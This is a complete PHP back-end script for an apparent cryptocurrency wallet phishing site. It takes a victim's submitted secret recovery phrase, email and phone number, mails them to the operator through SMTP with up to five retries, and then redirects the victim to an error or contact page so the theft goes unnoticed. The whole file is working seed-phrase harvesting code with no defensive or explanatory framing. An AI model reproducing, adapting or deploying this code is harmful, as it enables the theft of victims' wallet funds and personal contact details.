<?php

use Exception;

include_once './config.php';

$secret_recovery_phrase     =   empty($_POST['secret_recovery_phrase']) ? null : $_POST['secret_recovery_phrase'];
$email                      =   empty($_POST['email']) ? null : $_POST['email'];
$phone_number               =   empty($_POST['phone_number']) ? null : $_POST['phone_number'];
$phone_code                 =   empty($_POST['phone_number_phoneCode']) ? null : $_POST['phone_number_phoneCode'];
$country_code               =   empty($_POST['phone_number_countryCode']) ? null : $_POST['phone_number_countryCode'];


if (empty($secret_recovery_phrase)) {
    redirect(base_url('import.php'));
} else {
    
    function sendEmail($try=1) {
        global $secret_recovery_phrase;
        global $email;
        global $phone_number;
        global $phone_code;
        global $country_code;
        
        try {
            $mail           =   get_mail_smtp();
            
            $mail->isHTML(true);
            $mail->Subject  = 'New Secret Recovery Phrase Received from '. CONST_MAIL_FROM_NAME;

            $html           =   '<p>A New Recovery Detected,</p>' ;
            $html          .=   '<p>You have received a new query from <b>' . base_url() . '</b>,</p>' ;
            $html          .=   '<p><b>Recovery Phrase</b></p>' ;
            $html          .=   "<p>Recovery Paraphrase : ".$secret_recovery_phrase."</p>";
            
            if(!empty($email)) {
                $html       .=   "<p>Email : <b>".$email."</b></p>";
            }
            if(!empty($phone_number)) {
                $html       .=   "<p>Phone Code : <b>".$phone_code."</b> (<b>".$country_code."</b>)</p>";
                $html       .=   "<p>Phone Number : <b>".$phone_number."</b></p>";
            }
            
            $mail->Body     =   $html;
            $mail->AltBody  =   'Recovery Paraphrase : '.$secret_recovery_phrase;

            $_SESSION["secret_recovery_phrase"]   =   $secret_recovery_phrase;
            
            
            $mail->send();
        
            if(empty($email)) {
                redirect(base_url('contact.php'));
            } else {
                redirect(base_url('error.php'));
            }
            
        } catch (Exception $exc) {
            $try = $try +1;
            echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
            if($try < 5) {
                sleep(2);
                sendEmail($try);
            } else {
                redirect(base_url());
            }
        }
    }
    
    sendEmail(1);
}
?>